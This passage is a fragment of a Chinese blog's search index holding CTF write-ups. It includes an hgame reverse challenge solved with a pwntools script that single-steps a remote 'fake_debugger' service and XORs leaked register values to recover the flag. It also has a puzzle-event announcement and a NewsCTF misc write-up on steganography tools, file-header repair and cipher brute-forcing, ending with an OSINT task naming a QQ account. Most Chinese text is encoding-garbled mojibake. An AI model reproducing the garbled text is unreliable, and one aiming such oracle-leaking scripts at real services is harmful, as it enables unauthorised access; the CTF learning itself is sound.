\\x82\\x1fXQ/\\xa1V.\\xb9\\x91\\xc2\\xd1{\\x9d\\xe4;n\\x9f\\xbb\\xd7\\xeb\\x15\\xa8\\xc6b\\x1e\\xb0d\\x04^\\x000\\x0f\\xa8\\x9a\\xfe\\xa4\\x05|\\x9d\\xa4}s\\x05z\\x94\\xe9\\x80\\xda=97R\\x00?6A\\xa3' # possible m: b'\\xb5\\xa1ir\\xb3S\\x9f1\\x0bS\\x81Yu\\xfc\\x9ab\\x81\\x15&gt;\\xcf\\t\\xe3\\xcb\\xc9\\xdb\\xe1\\xc7\\x07\\x1fMI\\xb0o\\x0c[\\xae\\xf8\\x98\\x93\\xcb\\xfbT\\xa5\\xdah&amp;\\x8dLc\\xa0\\x80j-\\xd1?0\\xca]\\xee\\xf7\\xaa\\x7f9X' hgame{3xgCd~i5_re4l1y+e@sy^r1ght?} Reversefake_debugger beta ä½ å†™äº†ä¸€ä¸ªä»€ä¹ˆå¥‡æ€ªçš„debuggerï¼Ÿè¿™ä¸œè¥¿èƒ½ç”¨ï¼Ÿçœ‹èµ·æ¥è§„åˆ™ä¹Ÿä¸å¤ªä¸€æ ·ï¼Ÿ nc 101.132.177.131 9999 ç©ºæ ¼ + å›è½¦è¿›è¡Œå•æ­¥è°ƒè¯•ã€‚ å¯ä»¥å‘ç° ecx æ˜¯ä¸‹æ ‡ã€‚ é¦–å…ˆå¼€å¤´è‚¯å®šæ˜¯ hgame{ äºæ˜¯å¯ä»¥å†™ä¸ªè„šæœ¬éå†æ¯ä¸€ä½çš„å­—æ¯ï¼Œå¦‚æœä¸æç¤º Wrong Flag! Try again! åˆ™è¯´æ˜å¯¹äº†ã€‚ åæ¥å‘ç°è¿™ä¹ˆä¸è¡Œã€‚ å†çœ‹äº†äº¿ä¸‹ï¼Œæ­£ç¡®çš„ä¸‹ä¸€ä¸ªå­—ç¬¦æ˜¯ zf åˆ†åˆ«ä¸º 0 å’Œ 1 çš„ ebx çš„å€¼ç›¸äº’å¼‚æˆ–çš„é‚£ä¸ªã€‚ äºæ˜¯å°±å¥½åŠäº†ï¼Œç›´æ¥æå–ä¸€ä¸‹ï¼Œå¼‚æˆ–å®Œäº‹ï¼ ï¼ˆæˆ‘æ˜¯ fwï¼Œè¿™ä¸ªè„šæœ¬æˆ‘å†™äº†è´¼ä¹…ï¼Œåˆšå¼€å§‹æ˜¯çˆ†ç ´å¯†ç ï¼Œè·‘ç€ä¸€ç›´ä¸å¯¹ï¼Œåæ¥å‘ç°äº†å¼‚æˆ–å°±è¡Œï¼Œå†åæ¥æ‰å‘ç°å…¶å®æ˜¯å¾ªç¯è·³å‡ºæ¡ä»¶æˆ‘å†™é”™äº† ï¼ˆçˆ†ç ´è§£/å¼‚æˆ–è§£éƒ½è¡Œ \"\"\" fake_debugger beta MiaoTony \"\"\" import re from pwn import * context.log_level = 'debug' context.timeout = 10 def challenge(payload_raw: str): sh = remote('101.132.177.131', 9999) sh.recvuntil(\"Please input you flag now!\\n\") payload = payload_raw.ljust(25, 'D') sh.sendline(payload) r = sh.recvuntil('--------------INFO--------------\\n').decode() while True: try: sh.sendline(' ') r = sh.recvuntil('--------------INFO--------------\\n').decode() except EOFError: print(\"ERROR!!!!!\") return False, '' ecx = re.search(r\"ecx: (\\d+)\", r).group(1) zf = re.search(r\"zf: (\\d+)\", r).group(1) ebx = re.search(r\"ebx: (\\d+)\", r).group(1) print(\"======================== ecx:\", ecx) if int(ecx) == len(payload_raw): if zf == '0': ebx0 = ebx else: s_next = chr(int(ebx0) ^ int(ebx)) print(\"&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; Next is\", s_next) return True, s_next s = \"hgame{\" while True: print('======================================================&gt;', s) isTrue, i = challenge(s) if isTrue: s += i print('&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;', len(s), s) if i == '}': break å°ç»“ç¬¬äºŒå‘¨é¢˜ç›®è¿˜å¥½è¿˜å¥½ã€‚ AK äº† Miscï¼Œåé¢å‡ å¤©è¿‡å¹´å°±æ²¡çœ‹äº† 233. å–µå‘œï¼Œbinary å¥½éš¾ä¸ä¼šåšï¼Œå˜¤å˜¤å˜¤ã€‚ï¼ˆæŠ„ç¬¬ä¸€å‘¨çš„ï¼Œæˆ‘æ˜¯ fw å¥½èœå•Š æ–°å¹´å¿«ä¹å–µï¼ æœ‰å…´è¶£çš„è¯æ¬¢è¿æ¥çœ‹çœ‹å’±è‡ªå·±æ•´çš„ MeowGame è§£è°œé—¯å…³å§ï¼Œè¯¦è§ 2021 ç‰›å¹´å¤§å‰ï¼åˆæ˜¯ä¸€å¹´è§£è°œé—¯å…³ã€‚ ï¼ˆæºœäº†æºœäº†","path":"2021/02/15/CTF_2021HgameWeek2/"},{"title":"2021 ç‰›å¹´å¤§å‰ï¼åˆæ˜¯ä¸€å¹´è§£è°œé—¯å…³","text":"ç‰›å¹´å¿«ä¹åˆšåˆšè¿‡å»çš„åºšå­é¼ å¹´æ˜¯æä¸å¹³å‡¡çš„ä¸€å¹´ï¼Œè€Œä»Šè¾›ä¸‘ç‰›å¹´å¦‚çº¦è€Œè‡³ã€‚ ç¥å¤§å®¶åœ¨æ–°çš„ä¸€å¹´é‡Œèº«ä½“å¥åº·ï¼Œä¸‡äº‹é¡ºæ„ï¼Œç‰›æ°”å†²å¤©ï¼Œç‰›è½¬ä¹¾å¤ï¼ ç¢ç¢å¿µä¸å¥½æ„æ€ï¼Œä¹…ç­‰äº†ã€‚ ï¼ˆæ„Ÿè°¢ @CircultCoder å¤§ä½¬å¼€å‘çš„æœºå™¨äººç”Ÿæˆçš„è¡¨æƒ…åŒ… æ®è¯´ å»å¹´çš„é—¯å…³é¢˜ç›® ä¸€ç¯å¥—ä¸€ç¯å¥—å¨ƒå¤ªæ·±äº†ï¼Œåˆ°æœ€åæ²¡å‡ ä¸ªäººåšåˆ°äº†æœ€åä¸€æ­¥ï¼Œå–µå‘œï¼ å–µå–µå†³å®šè¿™æ¬¡ä¸å¼„è¿™ä¹ˆæ·±äº†â€¦â€¦ ä¸å¦‚å…ˆè§£å¼€ç¬¬ä¸€ä¸ª flagï¼Œåé¢å†æ”¾å‡ºå‰©ä¸‹å‡ é¢˜çš„å…¥å£ï¼Œè¿™æ ·å¯èƒ½ä¼šå¥½ä¸€äº›äº†å§ï¼ˆ é¢˜ç›®è¿™æ¬¡è¿˜æ˜¯ ä»¥ Misc é¢˜ç›®ä¸ºä¸»ï¼Œçœ‹å¿ƒæƒ…åé¢ä¼šä¸ä¼šåŠ ç‚¹é¢˜ã€‚ å¼€å±€ä¸€å¼ å›¾ï¼Œå‰©ä¸‹çš„å…¨é çŒœ ä¿—è¯è¯´çš„å¥½ï¼Œé‡åˆ°å›°éš¾ï¼Œç¡å¤§è§‰ï¼ï¼ˆSIGSLEEP é‚£å°±ä»è¿™å¼ å›¾å¼€å§‹å§ã€‚ å½“ç„¶ä½ ä¹Ÿå¯ä»¥ ç‚¹å‡»è¿™é‡Œ ä¸‹è½½åŸå›¾ã€‚ é™¤ç‰¹åˆ«æ³¨æ˜å¤–ï¼Œflag å½¢å¼å‡ä¸º miao{.+} ã€‚ æ³¨æ„è§£å‡ºæ¥çš„ flagã€çº¢åŒ…å£ä»¤ ä¸è¦éšä¾¿å‘ç»™åˆ«äººå•Šï¼ï¼ï¼ é¢„è®¡è¿™æ¬¡è§£è°œåº”è¯¥ä¼š æŒç»­å¥½å‡ å¤©ï¼Œæ‰€ä»¥ WriteUp ä»€ä¹ˆçš„åšå‡ºæ¥çš„å¸ˆå‚…æ™šå‡ å¤©å†å‘å§ Orz ç”±äºå„ç§å› ç´ ï¼Œå‡ºé¢˜å’•äº†æœ‰ä¸€æ®µæ—¶é—´ï¼Œéå¸¸ä¸å¥½æ„æ€å–µå‘œå‘œã€‚ Hintä¸‹é¢æ˜¯é’ˆå¯¹ ç¬¬ä¸€é¢˜ï¼ˆTask1ï¼‰ çš„ã€‚ æŸä¸€æ­¥ä¸­çš„åŸŸåï¼Œå½¢å¼ä¸éœ€è¦æ”¹åŠ¨ï¼Œæ‰“ä¸å¼€æ˜¯æ­£å¸¸çš„ã€‚å•Šä½ æ‰“å¾—å¼€ï¼Ÿæ²¡äº‹äº†è¿™æ¡ hint å¯¹ä½ æ¥è¯´æ²¡å¿…è¦äº†ã€‚ å¦‚æœå‹ç¼©åŒ…æ³¨é‡Šä¹±ç äº†ï¼Œè¯·ä½¿ç”¨ utf-8ã€‚ä¸å¥½æ„æ€ï¼Œä¸‹æ¬¡ä¸ç”¨ä¸­æ–‡äº†ã€‚ä¸è¿‡é—®é¢˜ä¸å¤§ï¼Œä¹‹åéƒ½è‹±æ–‡äº†ã€‚å¦‚æœè¿˜ä¸è¡Œçš„è¯ TG è”ç³»ã€‚ æ®è¯´æ ¡å†…æŸä¸ªç³»ç»Ÿä¸Šä¼ å‹ç¼©åŒ…åªèƒ½æ˜¯ rarï¼Œå¥‡æ€ªçš„æƒ³æ³•å¢åŠ äº†ã€‚ å–µå–µæœ‰æ—¶å€™ç›´æ¥æŠŠæ–‡ä»¶æ‹–è¿›åå…­è¿›åˆ¶ç¼–è¾‘å™¨é‡Œæ”¹ä¸œè¥¿ï¼Œä¸€ä¸å°å¿ƒæ–‡ä»¶æŸåäº†æ‰“ä¸å¼€äº†ã€‚ è¡¥å…… hint1ï¼Œæƒ³æƒ³ä¸­æ–‡åŸŸåçš„åŸç†ï¼Œä¸å¦‚åˆ°æµè§ˆå™¨é‡Œæ‰“å¼€ Network çœ‹çœ‹ Host é•¿å•¥æ ·ã€‚ç„¶åå†æƒ³æƒ³åŸŸåé™¤äº†ç”¨æ¥è§£æè¿˜èƒ½å¹²ä»€ä¹ˆã€‚ è¡¥å…… hint3&amp;4ï¼Œå¯¹æ¯”çœ‹çœ‹ zip æ–‡ä»¶å¤´é•¿å•¥æ ·ã€‚ è¡¥å…… hint5ï¼Œå–µå–µå‡†å¤‡å¼€ä¸ªè‡ªå·±çš„é‚®å±€ï¼ˆé›¾ï¼Œæ˜¯åŸŸåé‚®ç®±ã€‚ä¸ºäº†ç†Ÿæ‚‰æµç¨‹ï¼Œå…ˆç»™åŸŸåé…äº†ä¸ªå¥‡å¥‡æ€ªæ€ªçš„ä¸œè¥¿ï¼Œé¡ºä¾¿æŠŠä¸€ä¸²å¸¦ miao çš„å­—ç¬¦ç”»æ‰”åœ¨é‡Œé¢äº†ã€‚ã€Œçœ‹ä¸Šå»è¿˜ä¸é”™ï¼Œåº”è¯¥æ²¡äººå‘ç°è¿™ä¸ªå½©è›‹å§ qwqã€ [Important] æ®è¯´å¤§éƒ¨åˆ†äººè¢«å¡åœ¨äº†æå–å‹ç¼©åŒ…çš„é‚£ä¸€æ­¥ï¼Œè¿™æ˜¯å–µå–µæ²¡æƒ³åˆ°çš„ï¼Œé‚£å¹²è„†å’±ä»¬è·³è¿‡è¿™ä¸€æ­¥å¥½äº†ã€‚å–µå–µè¯´è¿™å›è¦ç™½ç»™äº†ï¼Œç›´æ¥ç»™å‡ºä¸€ä¸ªä¸éœ€è¦æ”¹æ–‡ä»¶å¤´çš„ç‰ˆæœ¬ï¼Œç‚¹å‡»è¿™é‡Œä¸‹è½½ å§ï¼ æœ‰é—®é¢˜å¯ä»¥ Telegram ä¸Šè”ç³» @meow_portal_botï¼Œå‘é‚®ä»¶ä¹Ÿè¡Œï¼ˆ å¼€äº†ä¸€ä¸ª Telegram Chat â€”â€” MeowGame 2021 ï¼Œæ¬¢è¿å¸ˆå‚…ä»¬æ¥ç© w~ BTWï¼Œç›®å‰è¿˜åªå‡ºäº†è¿™ç¬¬ä¸€ä¸ªé¢˜ï¼Œåé¢çš„é¢˜è¿˜æ²¡å‡ºå®Œï¼Œä¸æ€¥ä¸æ€¥ï¼Œæ…¢æ…¢æ¥â€¦â€¦ åé¢çš„é¢˜ç›®éœ€è¦è§£å‡ºç¬¬ä¸€é¢˜åæ‰èƒ½å¼€å¯ã€‚ï¼ˆæŒ‡å¹³å°ä¸Šï¼‰ å¸ˆå‚…ä»¬æ„Ÿå…´è¶£çš„æ¬¢è¿ä¸€èµ·æ¥å‡ºé¢˜å–µå–µ w MeowGame å¹³å° MeowGame å¹³å°æ¶æ„çš„è¯ï¼Œå‰ç«¯åŸºäº Vue.js + Vuetify UIï¼Œåç«¯åŸºäº Pythonï¼Œç»“åˆ serverless å®ç°ã€‚ å•Šä½ æ²¡çŒœé”™ï¼Œå–µå–µä¸“é—¨ä¸ºè¿™æ¬¡è§£è°œé—¯å…³å¼€å‘äº†ä¸ªå‰ç«¯å¹³å°ä»¥åŠåç«¯æ¥å£ï¼Œè¿™ä¸ªå¹³å°å°±æ˜¯ä¹‹åé¢˜ç›®çš„å…¥å£ã€‚ æ„Ÿè§‰æ•´ä¸ªè§£è°œé—¯å…³ï¼Œç¯å¢ƒéƒ¨ç½²äº†è´¼ä¹…ï¼Œé¢˜å€’æ˜¯è¿˜æ²¡å‡ºæˆï¼Œç”šè‡³è¡ç”Ÿå‡ºäº†å‡ ä¸ªå°é¡¹ç›®ï¼ˆï¼ˆ 20210219ï¼šå‡ºå¥½ Task 2 äº†ï¼ 20210227ï¼šå–µå–µç»ˆäºå‡ºå®Œ Task 3 äº†ï¼Œå‡ºä¸åŠ¨äº†ï¼ˆæ‘Šæ‰‹ç¡å¤§è§‰ 20210228ï¼šç”± cuso4-5h2o å¸ˆå‚…æä¾›çš„ Task 4 å·²æ”¾å‡ºï¼Œæœ¬é¢˜ä¸ºåŠ¨æ€ flagã€‚ æœ¬æ¬¡ MeowGame æŒç»­åˆ° 2021.3.5 æ™šä¸Š 23:59 ã€‚ ç»“æŸä¹‹åé¢˜ç›®ç¯å¢ƒä¼°è®¡å°±ä¸å†ç»´æŠ¤äº†å–µï¼ˆ éå¸¸æ„Ÿè°¢å¤§å®¶çš„å‚ä¸ï¼ qwq 20220428ï¼šæ·»åŠ äº†å‚è€ƒé¢˜è§£ï¼Œå–µ~ Just have funï¼ é¢˜è§£ / Writeupå–µå–µæ‡’å¾—å†™äº† æ”¾å‡ ä¸ªå¸ˆå‚…ä»¬çš„é¢˜è§£å‚è€ƒä¸€ä¸‹å§ï¼ imlk: meowgame2021 writeup (archive) Methionine Lee: ä¸“æ ï¼šMiaoTonyçš„æ˜¥èŠ‚é—¯å…³Writeup MiaoTonyçš„æ˜¥èŠ‚é—¯å…³Writeupï¼ˆ1ï¼‰ï¼šæ–‡ä»¶å¤´ &amp; TXTè®°å½• archive MiaoTonyçš„æ˜¥èŠ‚é—¯å…³Writeupï¼ˆ2ï¼‰ï¼šSSTV &amp; ç›²æ°´å° archive MiaoTonyçš„æ˜¥èŠ‚é—¯å…³Writeupï¼ˆ3ï¼‰ï¼šGit &amp; éšè—æ–‡ä»¶ archive","path":"2021/02/12/CTF_2021HappyChineseNewYear/"},{"title":"CTF | 2021 NewsCTF æ–°æ˜¥èµ› WriteUp","text":"å¼•è¨€NewsCTF 2021 æ–°æ˜¥èµ› çœ‹ç¾¤é‡Œå¸ˆå‚…è¯´è¿™å‡ å¤©æœ‰ä¸ªæ–°æ˜¥å°æ¯”èµ›ï¼Œåšå‡ºé¢˜ç›®è¿˜é€çº¢åŒ…ï¼Œé¡ºæ‰‹å°±æ¥çœ‹çœ‹äº†ã€‚ é¢˜ç›®æ®è¯´æ˜¯å°å¸ˆå‚…ä»¬è‡ªå·±å‡ºçš„ï¼Œä¹Ÿæ˜¯è‡ªå·±ç»„ç»‡çš„ï¼Œå¼€å¿ƒå°±å¥½ã€‚ å¹³å°åœ°å€ï¼šhttp://newsctf.top:8000/ start: 2021/2/8 12:00 end: 2021/2/11 12:00 å› ä¸ºæ¯”è¾ƒèœï¼Œå‡ºé¢˜äººåŸºæœ¬éƒ½æ˜¯å¤§ä¸€èŒæ–°ï¼Œæ‰€ä»¥æŸäº›æ–¹å‘é¢˜ç›®æ¯”è¾ƒå°‘è¯·è§è°… å¤§ä¸€èŒæ–°å¤ªå¼ºäº†ï¼ Miscmiscç­¾åˆ°å¤„å›¾ç‰‡ç»“å°¾æœ‰ä¸ªå‹ç¼©åŒ…ï¼Œé‡Œé¢ base64 è§£å¯†ä¸€ä¸‹å°±å¥½ ZmxhZ3tXZWxjMG1lX3QwX25ld3NjdGYhISF9CuaUr+S7mOWuneWPo+S7pFvmrKLov47mnaXliLDokIzmlrDnvqTotZtd flag{Welc0me_t0_newsctf!!!} æ”¯ä»˜å®å£ä»¤[æ¬¢è¿æ¥åˆ°èŒæ–°ç¾¤èµ›] happy ox è¿™æ¬¡æˆ‘ä»¬é‚€è¯·åˆ°äº†ç‰›çˆ·çˆ·æ¥ç»™å¤§å®¶æ‹œä¸ªå¹´ ï¼ˆå…±10åŒ…ï¼‰ å¾ˆæ˜æ˜¾ LSB æœ‰éšå†™ï¼Œæå–ä¸€ä¸‹ã€‚ å¾—åˆ°å‹ç¼©åŒ…å¯†ç  niuniandaji888 ç§‘æ¯”å¯†ç  åˆå› ä¸ºæ˜¯å°å†™ï¼Œå¾—åˆ° passwdiskbyydsezï¼Œå³ kbyydsez flag{0h_y0u_f1nd_Me_h3ck} æ”¯ä»˜å®å£ä»¤[ç‰›å¹´è¡Œå¤§è¿æ„¿å²æœˆå®‰å¥½] EMOJI EMOJI(ç¬‘) å¾—åˆ°çš„flagä¸­æ•°å­—çš„ä¸­æ–‡ä¸ºæ”¯ä»˜å®å£ä»¤çº¢åŒ…ï¼Œç¦æ­¢ä¸€äººå¤šåŒ…æˆ–åˆ†äº«ã€‚ å¦‚flag{t3st_123_1t} åˆ™å£ä»¤çº¢åŒ…ä¸ºï¼šä¸‰ä¸€äºŒä¸‰ä¸€ è¿˜æ˜¯æ”¹æ–‡ä»¶å¤´ã€‚ã€‚ æŸ¥äº†ä¸€ä¸‹ï¼Œè¿™æ˜¯ ã€Šé•¿å®‰12æ—¶è¾°ã€‹çš„æœ›æ¥¼ç³»ç»Ÿï¼Œå¤ªå¼ºäº†ï¼ 9å®«æ ¼çš„ç©ºé—´ï¼Œç”¨æ¥è¡¨ç¤ºä¸ªä½ã€‚ å·¦è¾¹çš„4ä¸ªèŠ±ç“£ä½ï¼Œç”¨æ¥è¡¨ç¤ºåä½ã€‚ å³è¾¹çš„4ä¸ªèŠ±ç“£ä½ï¼Œç”¨æ¥è¡¨ç¤ºç™¾ä½ã€‚ ä»€ä¹ˆéƒ½ä¸å‡ºç°ï¼Œå°±è¡¨ç¤º0ã€‚ Via ç ”ç©¶å®Œã€Šé•¿å®‰12æ—¶è¾°ã€‹çš„æœ›æ¥¼ç³»ç»Ÿï¼Œæˆ‘é­”æ€”äº† äºæ˜¯å°±æ˜¯ 799*248+21 å³ 198173ï¼Œä¸€ä¹å…«ä¸€ä¸ƒä¸‰ è§£å‹å¾—åˆ° key:sixgod ciphertext:ğŸ™ƒğŸ’µğŸŒ¿ğŸ¤ğŸšªğŸŒğŸğŸ¥‹ğŸš«ğŸ˜†âœ…ğŸŒâœ…ğŸš¨ğŸ“‚ğŸ“®ğŸ•¹ğŸ…ğŸ¥‹ğŸŒ‰ğŸ˜ğŸšªğŸ¤£ğŸ…ğŸ‘‘â˜‚ğŸ˜€ğŸ¦“â©ğŸ˜ğŸŒğŸ…ğŸŒ¿ğŸ˜ğŸ’µğŸµâ˜€âœ‰ğŸğŸŒªğŸš«ğŸ’µğŸğŸğŸ‘£ğŸ’µğŸ”ªğŸŒâœ‰ğŸ˜ğŸ˜‚ğŸš¨â˜‚ğŸ“®ğŸ”ªğŸ’µğŸ¹ğŸ‘‰ğŸğŸ”¬ğŸŒªğŸâ„¹ğŸ˜ŠğŸš¨ğŸ˜‚ğŸµğŸµğŸ˜ŠğŸš¨ğŸ”ªâœ–ğŸˆâ˜ºğŸ¦“ğŸš°â˜ƒğŸŒğŸšªğŸ‘£ğŸâœ‰ğŸ‘ŒğŸ”„âœ‰ğŸ’§ğŸ—’ğŸ—’ å…ˆçœ‹äº†çœ‹ Codemojiï¼Œä¸å¯¹åŠ²ã€‚ ç„¶åæŸ¥äº†ä¸€ä¸‹ï¼Œå‘ç°äº†ä¸ªå¸¦ key çš„ã€‚ emoji-aes è§£å¯† https://aghorler.github.io/emoji-aes/ emoji-aes encrypts string data with the symmetric AES encryption cipher (using crypto-js), and then replaces the Base64 output with emojis. å’±è‡ªå·±ä¹Ÿéƒ¨ç½²äº†ä¸€ä¸ªï¼Œåœ¨è¿™é‡Œ ==&gt; https://emoji-aes.miaotony.xyz/ flag{em0j1_Aes_1s_3_ni5e_3ncr9pt_to0l} ä¼ªè£…è€… https://wws.lanzous.com/ihGAlldzfmb æ”¯ä»˜å®çº¢åŒ…å£ä»¤æ˜¯flag{}é‡Œé¢çš„å†…å®¹,å¦‚æœæœ‰ä¸¤ä¸ªä»Šæ™šåƒé¸¡è¯·åˆ æ‰ä¸€ä¸ªã€‚ flagæ ¼å¼ï¼šflag{} ä¼ªè£…è€….rar å’Œæ­£å¸¸çš„ rar å¯¹æ¯”å¯ä»¥çœ‹åˆ°æ–‡ä»¶å¤´æ”¹æ‰äº† æ”¹å› rar å°±å¥½ã€‚ èƒŒæ™¯.txt: å°æ— æ­£åœ¨è¿½ä¸€éƒ¨å‰§,ä½†æ˜¯ä»–å¿˜äº†å‰§åä¸­ä¸€ä½è§’è‰²çš„åå­—,äºæ˜¯ä»–æˆªäº†ä¸ªå›¾(å¥½çœ‹çš„å‰§.png),å¼€å§‹äº†è¯¢é—®ç¯èŠ‚. -----ä½ èƒ½å¸®å°æ—è®¤å‡ºè¿™æ˜¯è°å˜› æ³¨:è§’è‰²åå­—(ä¸­æ–‡æ‹¼éŸ³)æ˜¯å‹ç¼©åŒ…çš„å¯†ç  ç™¾åº¦è¯†å›¾ä¸€ä¸‹ liuyijun ä¸å¯¹ï¼Œè¦è§’è‰²åå­—(ä¸­æ–‡æ‹¼éŸ³) ã€Šä¼ªè£…è€…ã€‹ è‰ï¼Œå°±æ˜¯é¢˜ç›®åç§°â€¦â€¦ wangtianfeng è§£å‹å¾—åˆ° key.wav æ–‡ä»¶ç»“å°¾ï¼Œè²Œä¼¼æ²¡å•¥ç”¨ã€‚ éŸ³é¢‘æœ‰ä¸€æ®µ DTMF æˆªå–è¿™éƒ¨åˆ†éŸ³é¢‘ï¼Œç„¶åæå–ä¸€ä¸‹ã€‚ ç»“åˆé¢‘è°±å›¾å†ä¿®æ­£ä¸€ä¸‹ã€‚ #222833344477773338866# ä¹é”®é”®ç›˜å¯†ç ï¼ˆè‰ï¼Œæ˜¯ GKCTF2020 çš„éŸ³é¢‘ ctfisfun steghide è§£å¯† $ steghide.exe extract -sf niu.jpg -p ctfisfun wrote extracted data to \"flag.txt\". flagä¸åœ¨è¿™é‡Œå“¦ç»§ç»­å¾€ä¸‹æ‰¾å§ ...... ç†Šæ›°ï¼šå‘‹é£Ÿå¾ˆèª’å’¯å™”ç ´å•½ä½æœ‰æ­¡å—šè¨»å—„å’Œä½ åƒå†¬è¨»ç‰©ç‰©çœ å—šç¬¨å˜æ“Šç¬¨å™¤è¥²ä½ çˆ¾å’¬ä½ çˆ¾å¸¸ç ´å¾ˆæ­¡æˆ‘å–æ‹™æ­¡æ„æ“Šå’¯å …æœ‰å—·å—¥å“æ€ç™¼å”¬è‚‰æ—¢æ­¡æ²’ç ´å™¤å’¯äººå’Œå˜¶å•½æ›´ ä¸ç†Šè®ºé“ ç„¶åå»æ‰ä¸€ä¸ª ä»Šæ™šåƒé¸¡ flag{ç‰›å¹´å¤§å‰ä»Šæ™šåƒé¸¡å°å¹´å¿«ä¹happy} å¬è¯´ä½ å–œæ¬¢è–…ç¾Šæ¯› é™„ä»¶åœ°å€ï¼šhttps://wwa.lanzous.com/iNdm7lfooaj ç¾Šæ¯›.jpg ç»“å°¾ Bacon Cipher åŸ¹æ ¹ PASSWORDISTINGSHUONIXIHUANYANGMAO ç„¶è€Œç”¨è¿™ä¸ªå»è§£å‹ç¼©åŒ…æ€ä¹ˆéƒ½è§£ä¸å¼€ã€‚ã€‚ åæ¥å‘ç°å›¾ç‰‡è¿˜æœ‰åŠ å¯†â€¦â€¦ JPHS tingshuonixihuanyangmao å¾—åˆ° Wdn1His87ï¼Œè§£å‹å¾—åˆ° brainpower.txt å’Œ flag.zip çœ‹brainpower.txt æ–‡ä»¶å¤´ ID3ï¼Œé‚æ”¹åç¼€åä¸º mp3. çœ‹ä¸€ä¸‹é¢‘è°±ï¼Œå¯¹æ•°åæ ‡å¥½çœ‹ä¸€ç‚¹ã€‚ PsWdMuzi123 è§£å‹ flag.zip 9DFF7800FFFE8784010580C646A85C22A7B3E321C04020B193D9BCE00DAEC7CD8953E8B982 //......å·¨å¤§å¤š 0606080003400BDFF000006000600101010000000A0A1A0D074E40598 çœ‹æœ«å°¾ï¼Œé€†åºè¿‡æ¥å°±æ˜¯ 89504Eï¼ŒPNG å¥½è€¶ã€‚ ç„¶å hex è§£ä¸€ä¸‹ï¼Œä½†æ˜¯æ‰“å¼€æŠ¥é”™ã€‚ å†çœ‹ä¸€ä¸‹ï¼Œåˆæ˜¯æ”¹äº†æ–‡ä»¶å¤´â€¦â€¦åº”è¯¥æ˜¯ jpg å›¾ç‰‡ã€‚ ç„¶åå¾—åˆ°äºŒç»´ç  æ‰«ç å¾—åˆ° flag{s0_easy_is_not_it?} æ”¯ä»˜å®[ä¸‰ä¸‰å…­å…­äº”å…«ä¹ä¹] ï¼ˆå·¨å¥—å¨ƒäº† ç¼ºæ–¤å°‘ä¸¤ä¸¤å¼ äºŒç»´ç  æ‰«ç å¾—åˆ° å¤§ç‰›ï¼šæˆ‘ä¹Ÿå¾ˆç–‘æƒ‘å‘¢ å‘ç°æ˜¯ä¸å…¨çš„ã€‚ ä¸¤å¼ å›¾å¼‚æˆ–ä¸€ä¸‹ï¼Œç„¶åå†åä¸ªè‰²ï¼Œå†è¡¥ä¸Šå››ä¸ªè¯†åˆ«æ¡†ã€‚ æ‰«ç å¾—åˆ°è§£å‹å¯†ç ã€‚ password:1q2w3e4r5t6y7u8i è§£å‹å¾—åˆ°ä¸¤å¼ å›¾ ç»“åˆ hint å¯†ç æ˜¯é çŒœçš„ï¼Œä¸æ˜¯çˆ†ç ´ï¼ æ˜¯guessä¸æ˜¯çŒœ ç”¨ outguess è§£å¯† å¾—åˆ°å¯†ç  news52ctf0 Polybius.txt: cipher:iftffsissrssirissr hint1:\\u660e\\u6587\\u957f\\u5ea6\\u662f\\u0038\\uff0c\\u4f1a\\u4e0b\\u68cb\\u5417\\uff1f hint2:Zmlyc3Q/LGxlbihmaXJzdCk9NQ== å¾—åˆ°çš„æœ‰æ„ä¹‰å­—ç¬¦ä¸²ï¼Œä½œä¸ºå‹ç¼©åŒ…å¯†ç ï¼Œæ‰èƒ½è¿›å…¥ä¸‹ä¸€å±‚ã€‚ hint1: æ˜æ–‡é•¿åº¦æ˜¯9ï¼Œä¼šä¸‹æ£‹å—ï¼Ÿ//é¢˜ç›®æ›´æ­£ä¸º9 hint2: first?,len(first)=5 æ³¢åˆ©æ¯”å¥¥æ–¯æ–¹é˜µå¯†ç  ç½‘ä¸Šæ‰¾äº†ä¸ªè„šæœ¬æ”¹æ”¹è·‘ä¸€ä¸‹ã€‚ import itertools s = \"first\" sumresult = [] numsumresult = [] ciper = \"iftffsissrssirissr\" for i in itertools.permutations(s, 5): # æ‰¾å‡ºæ‰€æœ‰å…¨æ’åˆ— sumresult.append(\"\".join(i)) for i in sumresult: temp = \"\" for j in ciper: temp += str(i.index(j)+1) numsumresult.append(temp) for i in numsumresult: ans_ = \"\" for j in range(0, len(i), 2): xx = (int(i[j])-1)*5+int(i[j+1])+96 if xx &gt; ord('i'): xx += 1 ans_ += chr(xx) print(ans_) å¯†ç å°±è¿™ä¸ªäº†ã€‚ è§£å‹å¾—åˆ° flag.txt å¯†æ–‡ï¼šmtHVnkLnIaP3FaW7KOWjTmKkVjWjVzKjdeNvTnAjoH9iZOIvTeHbvD== dic=JASGBWcQPRXEFLbCDIlmnHUVKTYZdMovwipatNOefghq56rs????kxyz012789+/ æ­å–œæ¥åˆ°æœ€åä¸€å±‚ï¼Œä½ çŸ¥é“base64ï¼Ÿï¼Œé‚£ä¹ˆè§£ä¸€ä¸‹å§ï¼Œå¾—åˆ°flagå°±å¯ä»¥æäº¤äº†å‘€ã€‚ flagï¼šNEWCTF2021{} é­”æ”¹çš„ base64ï¼Œalphabet å·®äº† 4 ä½ï¼ŒåŒ…æ‹¬ 34ju è¿™å››ä¸ªå­—ç¬¦ã€‚ æ‰‹åŠ¨è¯•äº†è¯•ï¼Œåº”è¯¥æ˜¯ JASGBWcQPRXEFLbCDIlmnHUVKTYZdMovwipatNOefghq56rs34ujkxyz012789+/ NEWSCTF2021{base64_1s_v3ry_e@sy_and_fuN} å“¥å“¥çš„ç§˜å¯†æœ‰ ç¤¾å·¥ / OSINT é¢˜å”‰ï¼ æ®è¯´å“¥å“¥çš„ç§˜å¯†è—åœ¨äº†å¦¹å¦¹çš„QQç©ºé—´é‡Œ QQï¼š2492853776 å»å¯»æ‰¾flagå§ 